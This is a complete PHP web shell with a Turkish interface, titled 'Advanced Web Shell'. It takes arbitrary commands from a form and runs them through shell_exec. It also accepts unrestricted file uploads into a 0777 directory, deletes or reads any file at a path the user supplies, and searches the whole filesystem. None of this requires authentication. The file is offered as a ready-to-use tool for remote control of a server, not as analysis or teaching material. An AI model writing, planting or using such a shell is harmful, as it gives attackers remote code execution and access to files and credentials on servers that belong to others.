<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gelişmiş Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
        }
        .container {
            width: 80%;
            margin: auto;
            padding: 20px;
            background-color: #1c1c1c;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        h1, h2 { color: #07bc0c; }
        textarea, input[type="text"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            background-color: #333333;
            color: #e0e0e0;
            border: 1px solid #444;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #07bc0c;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover { background-color: #06a10b; }
        pre {
            background-color: #1f1f1f;
            color: #e0e0e0;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            background-color: #333333;
            padding: 8px;
            margin-top: 5px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Gelişmiş Web Shell</h1>
    <p>Bu arayüz üzerinden komut çalıştırabilir, dosya işlemleri yapabilir ve çeşitli sistem bilgilerini görüntüleyebilirsiniz.</p>
    
    <div class="section">
        <h2>Komut Çalıştır</h2>
        <form method="POST">
            <input type="text" name="command" placeholder="Komut girin (ör. ls, pwd, whoami)" required />
            <button type="submit" name="run_command">Çalıştır</button>
        </form>
        <pre>
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['run_command'])) {
            $command = escapeshellcmd($_POST['command']);
            echo htmlspecialchars(shell_exec($command));
        }
        ?>
        </pre>
    </div>

    <div class="section">
        <h2>Dosya Yöneticisi</h2>
        
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" />
            <button type="submit" name="upload_file">Dosya Yükle</button>
        </form>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['upload_file'])) {
            $target_dir = "uploads/";
            if (!is_dir($target_dir)) {
                mkdir($target_dir, 0777, true);
            }
            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "<p>Dosya başarıyla yüklendi: " . htmlspecialchars($target_file) . "</p>";
            } else {
                echo "<p>Dosya yüklenirken bir hata oluştu.</p>";
            }
        }
        ?>

        <form method="POST">
            <input type="text" name="delete_file" placeholder="Silinecek dosya yolunu girin" required />
            <button type="submit" name="delete_file_btn">Dosyayı Sil</button>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['delete_file_btn'])) {
            $file_to_delete = $_POST['delete_file'];
            if (file_exists($file_to_delete) && unlink($file_to_delete)) {
                echo "<p>Dosya silindi: " . htmlspecialchars($file_to_delete) . "</p>";
            } else {
                echo "<p>Dosya bulunamadı veya silinemedi.</p>";
            }
        }
        ?>
    </div>

    <div class="section">
        <h2>Dosyaları Görüntüle ve İzinleri Kontrol Et</h2>
        <form method="POST">
            <input type="text" name="file_path" placeholder="Dosya yolu girin" required />
            <button type="submit" name="view_file">Görüntüle</button>
        </form>
        <pre>
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['view_file'])) {
            $file_path = $_POST['file_path'];
            if (file_exists($file_path)) {
                echo "Dosya İzinleri: " . substr(sprintf('%o', fileperms($file_path)), -4) . "\n";
                echo htmlspecialchars(file_get_contents($file_path));
            } else {
                echo "Dosya bulunamadı.";
            }
        }
        ?>
        </pre>
    </div>

    <div class="section">
        <h2>Dosya Araması Yap</h2>
        <form method="POST">
            <input type="text" name="search_file" placeholder="Aranacak dosya adını girin" required />
            <button type="submit" name="find_file">Ara</button>
        </form>
        <pre>
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['find_file'])) {
            $search_file = escapeshellarg($_POST['search_file']);
            $output = shell_exec("find / -name $search_file 2>/dev/null");
            echo htmlspecialchars($output ?: "Dosya bulunamadı.");
        }
        ?>
        </pre>
    </div>

    <div class="section">
        <h2>Yardım</h2>
        <p>Kullanabileceğiniz bazı komutlar:</p>
        <ul>
            <li><strong>ls</strong> - Dizindeki dosyaları listele</li>
            <li><strong>pwd</strong> - Geçerli dizini göster</li>
            <li><strong>cat [dosya]</strong> - Dosya içeriğini görüntüle</li>
            <li><strong>rm [dosya]</strong> - Dosyayı sil</li>
            <li><strong>chmod [izin] [dosya]</strong> - Dosya izinlerini değiştir</li>
        </ul>
    </div>
</div>
</body>
</html>
